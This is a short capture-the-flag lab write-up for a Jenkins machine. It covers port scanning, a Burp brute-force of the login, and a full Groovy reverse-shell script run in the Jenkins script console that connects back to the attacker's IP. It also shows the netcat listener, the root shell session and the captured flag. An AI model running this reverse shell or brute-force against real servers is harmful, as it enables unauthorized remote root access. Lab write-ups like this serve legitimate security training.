Pennyworth IP:10.129.215.113

rustscan:

PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack

nmap:

PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Jetty 9.4.39.v20210325
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).



on port 8080 , runs a jenkins ci

could not log in with defaul credentials found online: admin : password

In order to get some credentials, we could configure burp suite, and use the interceptor to do some brute forcing using cluster bomb attack:

we configure a list of payloads: admin,root,password and then we launch the attack. We soon notice that root:password are the correct credentials.

foothold:

we can run a groovy script to get a foothold into the machine:


String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


we need to make some changes, in order for this to work:

we change the host param to our ip, and we change the string cmd to "/bin/bash"

the final groovy script looks like thisL

String host="10.10.14.122";
int port=1234;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();



we then need to start a nc listener on port 1234. after this, we run the script and we get a reverse shell:

nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.215.113] 40018
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
ls
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
cd root
ls
flag.txt
snap
cat flag.txt
9cdfb439c7876e703e307864c9167a15






root flag; 9cdfb439c7876e703e307864c9167a15